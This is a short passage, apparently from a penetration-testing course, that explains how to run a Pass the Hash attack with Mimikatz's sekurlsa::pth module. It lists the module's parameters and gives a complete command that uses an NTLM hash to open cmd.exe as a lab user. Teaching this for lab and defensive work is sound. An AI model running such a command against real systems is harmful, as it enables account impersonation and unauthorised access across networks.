# Pass the Hash with Mimikatz (Windows)
The first tool we will use to perform a Pass the Hash attack is [Mimikatz](https://github.com/gentilkiwi). Mimikatz has a module named sekurlsa::pth that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. To use this module, we will need the following:

1) `/user` - The user name we want to impersonate.
2) `/rc4` or `/NTLM` - NTLM hash of the user's password.
3) `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
4) `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

**Pass the Hash from Windows Using Mimikatz:**
```bash
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
